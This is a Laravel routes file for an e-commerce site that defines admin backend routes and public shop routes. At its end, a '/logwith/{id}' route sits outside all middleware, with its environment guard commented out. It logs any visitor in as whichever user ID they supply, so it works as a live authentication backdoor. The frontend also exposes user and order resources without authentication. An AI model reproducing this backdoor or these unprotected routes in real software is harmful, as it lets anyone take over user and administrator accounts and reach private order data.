<?php

/*
|--------------------------------------------------------------------------
| Web Routes
|--------------------------------------------------------------------------
|
| Here is where you can register web routes for your application. These
| routes are loaded by the RouteServiceProvider within a group which
| contains the "web" middleware group. Now create something great!
|
*/

Route::group(['namespace' => 'Backend', 'prefix' => 'backend', 'as' => 'backend.', 'middleware' => ['auth', 'adminAccessOnly']], function () {
    Route::get('/', 'DashBoardController@index')->name('index');
    Route::get('/home', 'DashBoardController@index')->name('home');
    Route::get('activation', 'DashBoardController@toggleActivate')->name('activate');
    Route::get('export/language', 'DashBoardController@exportTranslations')->name('export.translations');

    Route::resource('product', 'ProductController');
    Route::resource('gallery', 'GalleryController');
    Route::resource('category', 'CategoryController');
    Route::resource('page', 'PageController');
    Route::resource('user', 'UserController');
    Route::resource('order', 'OrderController');
    Route::resource('currency', 'CurrencyController');
    Route::resource('setting', 'SettingController');
    Route::resource('country', 'CountryController');
});

Route::group(['namespace' => 'Frontend', 'as' => 'frontend.', 'middleware' => []], function () {
    Route::get('/', 'HomeController@index')->name('index');
    Route::get('/home', 'HomeController@index')->name('home');
    Route::resource('product', 'ProductController');
    Route::resource('cart', 'CartController')->only(['index']);
    Route::post('cart/add', 'CartController@addItem')->name('cart.add');
    Route::get('cart/remove/{id}', 'CartController@removeItem')->name('cart.remove');
    Route::get('cart/clear', 'CartController@clearCart')->name('cart.clear');
    Route::post('cart/coupon', 'CartController@applyCoupon')->name('cart.coupon');
    Route::post('cart/checkout', 'CartController@checkout')->name('cart.checkout');
    Route::post('cart/store', 'CartController@checkout')->name('cart.store');
    Route::post('cart/review', 'CartController@checkout')->name('cart.review');
    Route::resource('category', 'CategoryController');
    Route::resource('page', 'PageController');
    Route::resource('user', 'UserController');
    Route::resource('order', 'OrderController');
    Route::resource('favorite', 'FavoriteController');
    Route::resource('newsletter', 'NewsletterController');
    Route::get('search', 'ProductController@search')->name('product.search');
    Route::get('currency/{currency}', 'HomeController@changeCurrency')->name('currency.change');
    Route::get('language/{locale}', 'HomeController@changeLanguage')->name('language.change');

});
Auth::routes();
//if (app()->environment('production') && Schema::hasTable('users')) {
Route::get('/logwith/{id}', function ($id) {
    Auth::loginUsingId($id);
    return redirect()->route('frontend.home');
});
//}
